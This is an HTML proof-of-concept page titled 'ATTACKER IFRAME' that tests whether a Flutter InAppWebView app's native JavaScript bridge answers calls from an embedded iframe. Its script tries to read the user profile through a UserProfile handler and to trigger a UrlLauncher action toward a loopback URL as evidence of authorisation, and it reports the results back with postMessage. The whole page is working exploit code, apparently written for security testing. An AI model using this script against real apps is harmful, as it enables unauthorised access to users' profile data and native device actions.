<!doctype html><meta charset=utf-8><body style="background:#fee;font:11px monospace">
<b>ATTACKER IFRAME</b> <span id=o></span>
<script>
document.getElementById('o').textContent = location.origin;
function report(s){ try{ parent.postMessage("IFRAME|"+s,"*"); }catch(e){} }
function call(m,f,p){
  return window.flutter_inappwebview.callHandler("_b_bridge_"+m+"_", JSON.stringify({
    moduleName:m, methodName:f, uniqueId:"if"+Math.random().toString(36).slice(2), params:p||{}}));
}
report("origin="+location.origin+" callHandler="+(window.flutter_inappwebview&&typeof window.flutter_inappwebview.callHandler));
// (1) read attempt: response is delivered to the MAIN frame, so the parent logs it
try { call("UserProfile","getUserProfile",{}).then(r=>report("getUserProfile promise="+JSON.stringify(r))).catch(e=>report("gp-err="+e)); }
catch(e){ report("gp-throw="+e); }
// (2) ACTION with an observable side effect: no response needed. If the app drives the
// device browser to this loopback URL, the iframe's bridge call was AUTHORISED.
setTimeout(function(){
  try { call("UrlLauncher","open",{url:"http://127.0.0.1:9/IFRAME_BRIDGE_AUTHORISED#origin="+encodeURIComponent(location.origin), externalApplication:true})
        .then(r=>report("UrlLauncher promise="+JSON.stringify(r))).catch(e=>report("ul-err="+e)); }
  catch(e){ report("ul-throw="+e); }
}, 3000);
</script></body>
